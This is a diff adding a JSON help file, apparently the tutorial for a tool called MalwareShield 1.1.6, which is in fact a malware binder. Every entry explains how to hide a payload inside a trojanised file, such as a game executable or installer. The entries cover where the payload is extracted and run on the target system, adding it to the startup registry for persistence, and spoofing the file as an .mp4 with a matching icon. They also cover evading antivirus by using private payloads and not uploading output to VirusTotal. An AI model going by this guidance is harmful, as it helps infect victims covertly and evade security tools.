@@ -1,0 +1,62 @@
+[
+	{
+		"title":"Tutorial of MalwareShield 1.1.6",
+		"text":"Make sure you have the latest version of MalwareShield installed."
+	},
+
+	{
+		"title":"Important note:",
+		"text":"Do not upload the embedded file to websites like Total Virus!\nAlthough antiviruses do not recognize it! But Total Virus spends weeks running and checking it by virtual servers and finally realizes that there is a payload inside this file. In that case, your hash file is known as malicious and you need to create a new embedded file."
+	},
+	
+	{
+		"title":"Saving the file gets stuck at 99%:",
+		"text":"This happens because your icon file format is incomplete.\nMake sure your icon file is a correct .ico file format.\nIf your icon file was correct but this happened again, you probably need to reinstall the software or your Windows does not support it."
+	},
+
+	{
+		"title":"",
+		"text":"Options available on the Embed page:"
+	},
+	{
+		"title":"Original file:",
+		"text":"You must select a file to embed with the payload. You can select any file.\nThere is no limit on the file size, but we suggest that the file size be less than 30 MB.\nGame executable files in the game folder or installation files are good targets."
+	},
+	{
+		"title":"Payload file:",
+		"text":"You must select your payload file.\nImportant note: Your payload must be well coded and private.\nIf you use public payloads, the antivirus will detect your payload after the target system is infected."
+	},
+	{
+		"title":"Extract original file to:",
+		"text":"The path where the original file is extracted and executed in the target system. You can change it."
+	},
+	{
+		"title":"Extract payload file to:",
+		"text":"The path where the payload file is extracted and executed in the target system.  You can change it."
+	},
+	{
+		"title":"Add payload to startup registry:",
+		"text":"If you enable it, your payload will run automatically after the system boots."
+	},
+	{
+		"title":"Run payload with WScriptShell:",
+		"text":"If you enable it. After extracting the payload in the target system. Your payload will be executed as a process by Visual Basic Script functions in the WScriptShell layer.\nEnabling or disabling it depends on your knowledge of the payload type.\nHowever, if you don't know if this is suitable for your payload or not, you can try both modes in a virtual machine."
+	},
+	{
+		"title":"Add custom command:",
+		"text":"You can run a custom command before running the original file and payload."
+	},
+	{
+		"title":"Spoof Extension:",
+		"text":"We suggest don't use this option! Because antiviruses will detect the embedded file. This option is for special conditions.\nBy enabling this option, you can set any extensions to the output file.\nFor example, you can set the mp4 extension and select the corresponding icon of the mp4, then an embedded file with the mp4 extension will be created.\n\n-The name of the final file will be preexe.mp4, you can only change the first 3 letters of it.\n-Be careful not to put a dot when setting the file extension and write only the extension."
+	},
+	{
+		"title":"Icon file:",
+		"text":"You must select an .ico file to set the embedded file icon."
+	},
+	{
+		"title":"Save Output:",
+		"text":"Select the path of your output file."
+	}
+	
+]
